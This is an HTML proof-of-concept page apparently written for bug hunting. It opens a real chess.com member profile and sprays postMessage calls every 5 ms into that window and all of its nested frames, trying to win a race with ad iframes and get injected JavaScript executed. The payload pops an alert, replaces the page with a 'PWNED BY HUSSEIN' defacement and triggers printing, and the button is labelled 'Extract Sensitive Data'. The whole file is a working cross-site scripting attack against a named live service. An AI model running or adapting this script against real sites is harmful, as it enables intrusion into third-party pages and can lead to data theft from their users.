<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Chess.com Recon Attack</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 100px; }
        button { padding: 15px 30px; font-size: 20px; background-color: #e53e3e; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Chess.com FATO Recon</h1>
    <button onclick="startAttack()">Extract Sensitive Data</button>

   <script>
    let payload = `
        // 1. إثبات بصري لا يمكن تجاهله
        alert('🎯 XSS SUCCESS ON: ' + document.domain);
        document.body.innerHTML = '<h1 style="color:red; font-size:100px; text-align:center; margin-top:20%;">PWNED BY HUSSEIN</h1>';
        document.body.style.backgroundColor = 'yellow';
        
        // 2. محاولة تنفيذ الطباعة
        window.print(); 
        
        // get_ext
    `.replace(/\n/g, ' ');

    function blast(win) {
        try {
            // نبعت الرسالة
            win.postMessage(payload, "*");
            
            // recursion للدخول في كل الطبقات
            for (let i = 0; i < win.frames.length; i++) {
                blast(win.frames[i]);
            }
        } catch(e) {}
    }

    function startAttack() {
        // نفتح الصفحة اللي إنت أكدت إن فيها الإعلانات
        let victimWin = window.open("https://www.chess.com/member/hussein-e3", "victim");

        console.log("🚀 Attack started... Spaming for 20 seconds.");

        // نضرب كل 5 ملي ثانية (أسرع بمرتين) لمدة 20 ثانية كاملة
        // ده بيضمن إننا نكسب الـ Race Condition في اللحظة اللي الـ iframe بيتخلق فيها
        let attackInterval = setInterval(() => {
            if (victimWin) {
                blast(victimWin);
            }
        }, 5); 

        // نوقف الضرب بعد 20 ثانية عشان المتصفح ميهنجش
        setTimeout(() => {
            clearInterval(attackInterval);
            console.log("🏁 Attack finished.");
        }, 20000);
    }
</script>
</body>
</html>
